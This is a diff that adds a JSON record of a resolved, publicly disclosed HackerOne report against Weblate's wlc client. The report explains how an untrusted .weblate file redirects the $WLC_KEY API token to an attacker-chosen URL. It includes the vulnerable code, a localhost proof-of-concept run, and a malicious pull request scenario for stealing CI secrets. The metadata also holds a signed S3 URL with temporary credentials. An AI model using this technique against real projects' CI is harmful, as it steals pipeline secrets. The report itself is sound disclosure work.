@@ -1,0 +1,140 @@
+{
+  "id": 3825141,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zODI1MTQx",
+  "url": "https://hackerone.com/reports/3825141",
+  "title": "API token sent to URL dictated by an untrusted project .weblate file",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2026-06-25T18:50:52.626Z",
+  "submitted_at": "2026-06-25T18:50:53.927Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "type5afe",
+    "url": "/type5afe",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/a8t1gcsr5qaauujrjav1q4asf89z/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 19468,
+    "url": "https://hackerone.com/weblate",
+    "handle": "weblate",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/019/468/71eb3827ae9f2a388f27bd4b7eefd20bc3ac813c_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/468/71eb3827ae9f2a388f27bd4b7eefd20bc3ac813c_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Weblate",
+      "twitter_handle": "WeblateOrg",
+      "website": "https://weblate.org/",
+      "about": "Weblate is a libre software web-based continuous localization system"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2026-22251"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-09-04T08:10:51.551Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-08-05T08:10:39.432Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "`wlc` discovers project configuration by walking the current working directory and\n**every parent directory** for `.weblate` / `.weblate.ini` / `weblate.ini`\n(`WeblateConfig.find_project_config`). That file sets the API `url`. The API key,\nhowever, is resolved independently and is **not bound to a trusted URL source**:\nwith `$WLC_KEY` set (the project's own documented CI pattern) the secret is sent to\nwhatever URL the discovered config names. If the `.weblate` is attacker-controlled\n— a malicious pull request to a public repo, a cloned/untrusted repo, a planted\nfile in any ancestor directory — running any wlc command ships the secret API\ntoken to an attacker-chosen server. This is the same \"token must not egress to an\nunexpected origin\" property that `normalize_request_url` defends for *server*-\nreturned URLs, left open for the *configured* URL.\n\n## Technical Detail\n\n### Root cause\n\n```python\n# wlc/config.py:67-94  @ 7c01e2f\n@staticmethod\ndef find_project_config() -> str | None:\n    \"\"\"Find the nearest project configuration file.\"\"\"\n    cwd = os.path.abspath(\".\")\n    prev = None\n    while cwd != prev:                       # walk CWD and every ancestor\n        for name in (\".weblate\", \".weblate.ini\", \"weblate.ini\"):\n            conf_name = os.path.join(cwd, name)\n            if os.path.isfile(conf_name):\n                return conf_name             # untrusted file controls [weblate] url\n        prev = cwd\n        cwd = os.path.dirname(cwd)\n    return None\n\ndef load(self, path=None) -> None:\n    if path:\n        ...\n    else:\n        if config := self.find_config():           # user/global config\n            self.read(config)\n        if config := self.find_project_config():    # project config OVERRIDES url\n            self.read(config)\n    ...\n```\n\n```python\n# wlc/config.py:101-113  @ 7c01e2f\ndef get_url_key(self) -> tuple[str, str]:\n    url = (\n        self.cli_url\n        or os.environ.get(\"WLC_URL\", \"\")\n        or cast(\"str\", self.get(self.section, \"url\"))   # <- from .weblate\n    )\n    key = (\n        self.cli_key\n        or os.environ.get(\"WLC_KEY\", \"\")                # <- the secret, origin-unbound\n        or cast(\"str\", self.get(\"keys\", url, fallback=\"\"))\n    )\n    return url, key\n```\n\nThe `[keys]` lookup *is* origin-scoped (`self.get(\"keys\", url)`), reflecting the\nmaintainers' intent that a key belongs to a specific URL (CVE-2026-22251 hardening).\nBut `$WLC_KEY` short-circuits that scoping: it is returned for **any** `url`,\nincluding a URL that came from an untrusted `.weblate`. The token is then attached\nin `invoke_request` (`Authorization: Token {self.key}`, client.py:240-241) and sent\nto that URL. `normalize_request_url` does not help: it only constrains URLs the\n*server* returns relative to the configured base; the configured base itself is the\nattacker's value.\n\n## Proof of Concept\n\n### Setup\n\n```\ngit clone https://github.com/WeblateOrg/wlc && cd wlc\ngit checkout 7c01e2f5a5bed48e50a134c96951a5b212f446a4\npython3 -m venv venv && . venv/bin/activate\npip install \"requests>=2.32\" \"urllib3>=2.0\" python-dateutil pyxdg argcomplete\n```\n\n### Trigger\n\n```\npython3 c01_weblate_config_exfil.py\n```\n\nThe script writes an attacker `.weblate` (`url = http://127.0.0.1:9100/api/`) into\na temp repo, `cd`s into it, exports `WLC_KEY`, and runs `wlc list-projects`.\n\n### Observable result\n{F6153091}\n```\nattacker collector captured:\n  Host header  : 127.0.0.1:9100\n  Authorization: Token ci-secret-WLC_KEY-do-not-leak\nRESULT: *** WLC_KEY LEAKED TO REPO-CONTROLLED URL ***\n```\n\n## Impact\n\n- **Direct primitive**: theft of the Weblate API token by anyone who can influence\n  a config file on the victim's discovery path.\n- **Chain potential** (per 05-chain-analysis):\n  - *Downstream*: the token grants the attacker the victim's full Weblate API\n    capability (read/write translations; `commit`/`push`/`pull`/`reset` on linked\n    VCS repos; object deletion; project/component management if privileged).\n  - *Cross-component*: in CI this token is a pipeline secret; its loss can cascade\n    into the connected source repositories the Weblate project pushes to.\n- **Realistic exploitation**: a public project runs `wlc push`/`wlc pull` in CI\n  with `WLC_KEY` as a secret and the URL taken from the checked-out repo (the\n  documented pattern). An attacker opens a pull request that adds/edits `.weblate`\n  to point `url` at their server (or, for a self-hosted runner, any reachable\n  internal host). When CI runs wlc, the secret token is delivered to the attacker.",
+  "weakness": {
+    "id": 18,
+    "name": "Information Disclosure"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 6153091,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/l5kypqiqmsno5p8tpj1ozygd5s13?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5C3YPVLK%2F20260904%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260904T103539Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQC%2F55Nkj4RsoetcByqFyosOibIo9uvUlnYhRMxF9itPVQIgZyP4o5LNNjXfSpjNFC905i%2FlC%2FkA%2B8B%2B%2FuVCoJvuDlAqugUI8%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDKp0yOvEHJIKHPg39iqOBS%2Fm2Ja5WlZOIEYiCqGCKgITt%2FBzeK3cwqUvcPxFThqi%2FlIrl7tjSII38LTrXEgrG3Jx%2B7ZZsMwq%2B22rFeUE2HNVSF7iKBopOwL4TsVrVrada7sPVtXFXI1qkARcnvqXfwoYzN4iq8elb2iUGZiU0%2FDklYJbJRTueHBK8K3uhJIjh1prWJ9%2BUcV0wU%2FzmrLaTMZkU5HOwI0HHBcejnWDB%2FBYp3FDSWEl297EP%2F%2BF5Hvv6ok4MtUV4BfKI1EXbN7OQknsn8NWD%2BfGTMFcq2CaBf7KHarru8IWO30WFpyBdog3ywfKQidmFagSUDC1a5B%2BQD1q0D4%2Fl9acqr5%2BnUF2TLCbPDeL%2Bb8t2gjTvF3Hbv%2BENa3stBTCdykVFmj4IdJ3aU0rHY96lyQ8fIUouPS1xBtIuydRJvXCBEH6x502xQ08mDGGxZafHZcoyYx8wS1WpYBe9JtXKvDhY5xaAeRSofnvY5%2BnYbVVtts2CbyPB87vHNIzgD0Ei2O%2BAOxnkGs1S9JI%2FudPaZMC6odIxqzlvo671KTOWhNZDv6W09ObH%2FXMg0oi7mfy8234D3Orf6%2FVYY9xij0JH5Yci4fiyde8EB5PrYY2zmnpFJ62IDkmiG0urMKEuAWqSnnZKI6vjaO75EpAFVRDfCvUf7%2B4j0U4kp3xdce56P8X3Rd%2BjtpoB%2BQ7wiTWhIqE1R9kGKABJ24OhfNmfAVPF5VdyphMwteGBwxqw%2FjMW%2Bstse0E%2BNAsoFDYbrI8A0kmqtbdKUfoZcvCeKBk8dxnh01Eu0jByC0nsnkZbBVJSKCHG7qrdmYKrZQV090q6psKNbwu84KT0bUm%2Bkkrst8%2Fow9sqKsRNZEc1D8h2gz3lHkcn8GmLTOAMTDfourUBjqxAYDu4EclLu5DzuCzYcZ6fQQIwQJ%2BK%2FUlR5a5KTP%2BausGxEhmy4bwHasf0Nm1xRGHOkEDT8OKs9%2FoDWM4szR9k75AltEPokKLy6RYlPeNXS8REJ6kuIiN9Fyk2X%2Bmv95W%2B6OUcOAwOVAo7cL8xaBJpyGbil%2FQGTasMT4EERmfsLgk%2BokvPq2eeGkXxo%2BgX5oVDXdgVxnofu%2BufhX7ScZQOlwAJM5kcSooaLbIRs6uo94QAw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3686782cc1658d0a4707b0ec2a8a483e9d2e2b6d240828e473479612ea27d231",
+      "file_size": 22158,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": "2026-09-04T08:10:39.933Z",
+  "allow_singular_disclosure_after": -8699.420557041,
+  "singular_disclosure_allowed": true,
+  "vote_count": 4,
+  "voters": [
+    "type5afe",
+    "2026",
+    "shaun212",
+    "stackraid"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 6.3,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "local",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 174,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/WeblateOrg/wlc",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
